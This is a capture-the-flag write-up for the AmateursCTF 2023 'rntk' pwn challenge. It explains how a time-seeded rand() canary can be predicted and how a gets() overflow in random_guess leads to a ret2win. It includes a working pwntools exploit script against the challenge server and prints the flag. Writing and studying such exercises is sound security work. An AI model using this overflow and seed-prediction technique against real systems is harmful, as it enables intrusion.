# AmateursCTF 2023

## rntk

> check out my random number toolkit!
>
>  Author: voxal
>
> [`chal`](chal) [`Dockerfile`](Dockerfile)

Tags: _pwn_

## Solution
For this challenge we only get a compiled binary. Inspecting the binary gives the following.

```c
generate_canary();
while( true ) {
    puts("Please select one of the following actions");
    puts("1) Generate random number");
    puts("2) Try to guess a random number");
    puts("3) Exit");
    local_c = 0;
    __isoc99_scanf(&DAT_00402138,&local_c);
    getchar();
    if (local_c == 3) break;
    if (local_c < 4) {
        if (local_c == 1) {
        uVar1 = rand();
        printf("%d\n",(ulong)uVar1);
        }
        else if (local_c == 2) {
        random_guess();
        }
    }
}
```

The main prints some kind of menu. Random numbers can be generated by pressing `1`, random numbers can be guessed by pressing `2` and the program can be exited by pressing `3`. The user input is not exploitable here, but before all this `generate_canary` is called.

```c
void generate_canary(void)
{
  time_t tVar1;
  
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  global_canary = rand();
  return;
}

This function initializes the random generator with `time(NULL)` and generates a random number. The canary is used then in `random_guess`.

```c
void random_guess(void)
{
  int iVar1;
  long lVar2;
  char local_38 [40];
  int local_10;
  int local_c;
  
  printf("Enter in a number as your guess: ");
  local_c = global_canary;
  gets(local_38);
  lVar2 = strtol(local_38,(char **)0x0,10);
  local_10 = (int)lVar2;
  if (local_c != global_canary) {
    puts("***** Stack Smashing Detected ***** : Canary Value Corrupt!");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = rand();
  if (local_10 == iVar1) {
    puts("Congrats you guessed correctly!");
  }
  else {
    puts("Better luck next time");
  }
  return;
}
```

The guess is entered by the user, converetd from string to integer. Then the canary is used to detect stack smashing. This makes sense, since the user input is read via `get` and allows a buffer overflow. To cope with this the canary is checked against the before generated random canary value.

The rest of the function is simple. One more random number is generated and tested against our input value and then a success or fail message is printed. No flag anywhere. But there is one more function which is never called.

```c

void win(void)
{
  char local_58 [72];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("flag file not found");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(local_58,0x40,local_10);
  puts(local_58);
  return;
}
```

This is a typical ret2win setup. The user overflows the buffer in `random_guess` and overrides the return address to point to `win`. Sadly the random canary is inbetween, so to return to `win` we first need to know the canary value.

Luckily for us this is be manageable with a bit of good timing. Since `time(NULL)` is used for initialization we can try to `guess` the timestamp. This is easily done, since the value is in second granularity. The exploit then is like this:

- first initialize the rng with `time(NULL)` exactly how the application does
- generate a canary candidate by calling `rand()`. This is also what the application does
- let the application generate a random number for us. We generate also another random numer. If both are matching we have found the correct seed and all subsequent random numbers are idendical to the numbers the application generated. Even better, we know the value of the canary

This works since it's known that `rand` will produce deterministic values when the same seed is used.

After knowing the canary the rest is very basic. Overflowing until the canary comes with random values. Writing the canary value. Overflowing the rest until the return address on the stack and then overriding this with the address to the win function.

```python
from ctypes import CDLL
from math import floor
import time
from pwn import *

libc = CDLL('libc.so.6')

elf = context.binary = ELF('chal')

found = False
while not found:
    p = remote("amt.rs", 31175)
    #p = process("chal")
    now = int(floor(time.time()))
    p.sendlineafter(b"3) Exit", b"1")
    p.recvuntil(b"\n")
    server_random = int(p.recvline())
    for i in range(-2000, 2000):
        libc.srand(now+i)
        canary = libc.rand()
        local_random = libc.rand()
        if server_random == local_random:
            print("found ", server_random, local_random)
            found = True
            break
    if not found:
        p.close()

p.sendlineafter(b"3) Exit", b"2")

payload = str(libc.rand()).encode()
payload += (40 - len(payload)) * b'\x00'
payload += p32(0xdeadbeef)
payload += p32(canary)
payload += p64(0xc0febabe)
payload += p64(elf.symbols.win)

#gdb.attach(p)
p.sendlineafter(b"as your guess:", payload)
p.interactive()
```

Flag `amateursCTF{r4nd0m_n0t_s0_r4nd0m_after_all}`